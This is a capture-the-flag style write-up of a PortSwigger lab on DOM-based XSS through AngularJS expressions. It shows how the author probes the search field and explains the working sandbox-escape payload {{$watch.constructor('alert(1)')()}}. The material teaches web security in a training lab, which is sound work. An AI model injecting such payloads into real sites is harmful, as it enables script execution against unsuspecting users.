<h1 align="center"> Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded </h1>

<img width="1000" height="600" alt="image" src="https://github.com/user-attachments/assets/bb039d00-e0b5-4be4-b72b-237d579c62b5" />


## Lab URL: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression


## Requirements:
 This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function. 


# Start Lab
<img width="1000" height="620" alt="image" src="https://github.com/user-attachments/assets/bb039d00-e0b5-4be4-b72b-237d579c62b5" />

- Access the Lab:
<img width="1162" height="950" alt="image" src="https://github.com/user-attachments/assets/0051ba32-25d7-4e07-9c6b-29e14372067b" />

- If in this i input something like:
````
test123
````
<img width="755" height="800" alt="image" src="https://github.com/user-attachments/assets/489699ac-5123-4f55-ab96-2cc2a813a979" />

<img width="757" height="333" alt="image" src="https://github.com/user-attachments/assets/dbb80f7a-6db3-4f90-afaf-fdef0b71e473" />

- If i want to see what i was input, press `F12` or `Right-click` -> `Inspect`:
<img width="1566" height="782" alt="image" src="https://github.com/user-attachments/assets/9f8fedcd-4a12-447d-a8cc-ed36a55cbaac" />

- An din this i don't see any `Javascript` here.


- After i want to see source code -> `Right-click` -> `View Page`:
<img width="742" height="622" alt="image" src="https://github.com/user-attachments/assets/6021f935-fd8b-4376-8ac9-bc34b3e3df22" />

- But i see only this:
<img width="1788" height="680" alt="image" src="https://github.com/user-attachments/assets/2d88097a-c5ec-41be-8e04-844a9b2472f6" />


- If i search for this:
````
{11 + 22}
````
<img width="934" height="403" alt="image" src="https://github.com/user-attachments/assets/68a76663-ae1a-4207-b21b-31754bdf16dd" />

````
{{22 + 22}}
````
<img width="925" height="399" alt="image" src="https://github.com/user-attachments/assets/e4a8eca3-3570-43b7-8614-f7eb914f54d7" />



````
alert()
````
<img width="960" height="436" alt="image" src="https://github.com/user-attachments/assets/929664be-1ee2-412c-b4c0-d360e588b660" />

<img width="1851" height="572" alt="image" src="https://github.com/user-attachments/assets/8f9fe81c-ed71-43ee-92fd-be67871a6ff7" />



### MVC Framework Reminder
  - MVC - FRAMEWORK
  - M - Model
  - V - View
  - C - Controller

- Just a reminder of what MVC means in web frameworks like AngularJS.



- Constructor & AngularJS Services
````
CONSTRUCTOR:
$scope
$watch
$on
$eval
$emit
$apply
$digest
````
- See more angularJS:


These are core AngularJS services and properties:
- `$scope`: The data model object passed to views.
- `$watch`: Watches for changes in scope variables.
- `$eval`: Evaluates an expression in the current scope.
- `$apply`: Triggers digest cycle manually.
- `$digest`: Processes watchers (usually called internally).
- `$on`, `$emit`: For event handling.


- The Exploit Payload:
````
{{$watch.constructor('alert(1)')()}}
````
<img width="900" height="408" alt="image" src="https://github.com/user-attachments/assets/b1910b45-5dc5-4315-9bcf-dff250ca2771" />

<img width="927" height="479" alt="image" src="https://github.com/user-attachments/assets/43299c65-d730-4f0b-ac1e-2ad7fb15a587" />

<img width="918" height="404" alt="image" src="https://github.com/user-attachments/assets/9eac890e-24fd-4aad-bb63-8cdb0693b2dc" />

<img width="1849" height="674" alt="image" src="https://github.com/user-attachments/assets/f1782b94-3fa4-4e82-8224-c714f440b48b" />

- Now we got successful to input payload.


**is a clever and dangerous AngularJS-specific XSS (Cross-Site Scripting) payload that exploits AngularJS’s expression sandbox to execute arbitrary JavaScript — even when traditional <script> or event-handler injections are blocked.**



### Context: AngularJS Expressions (Not Regular HTML/JS)
- In AngularJS, you can embed expressions directly in HTML using double curly braces:
````
{{ 2 + 2 }}
{{ user.name }}
````
- These expressions are evaluated in a restricted sandbox — but not secure. Attackers found ways to break out of this sandbox, especially in older versions (AngularJS ≤ 1.6).

**⚠️ This only works if the app uses AngularJS and reflects user input inside {{ }}.**


#### Breakig down the payload:
- `$watch`:
  - In AngularJS, `$watch` is a function available in the scope during expression evaluation.
  - Every function in JavaScript has a property called `.constructor`.
````
function f() {}
console.log(f.constructor === Function); // true
````

- `$watch.constructor`:
  - This is equivalent to the `Function` constructor:
````
$watch.constructor === Function
````

- `$watch.constructor('alert(1)')`:
  - This creates a new function from a string:
````
var fn = Function('alert(1)'); 
// same as: function() { alert(1); }
````

- `$watch.constructor('alert(1)')()`:
  - The trailing `()` executes the newly created function.
  - `alert(1)` runs in the global context.


- Wrapping in `{{ ... }}`:
  - AngularJS evaluates the entire expression inside `{{ }}`.
  - So: `{{ $watch.constructor('alert(1)')() }}` → runs `alert(1)`.



- Why this bypasses Filters:
  - No `<script>` tags
  - No HTML event handlers (`onerror`, `onload`, etc.)
  - Looks like a "harmless" Angular expression
  - Works even if input is reflected only inside `{{ }}`.


----


<h2 align="center"> Finished Lab 11 DOM XSS in AngularJS </h2>



<h2 align="center"> Athored: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 26/11/2025 </h3>
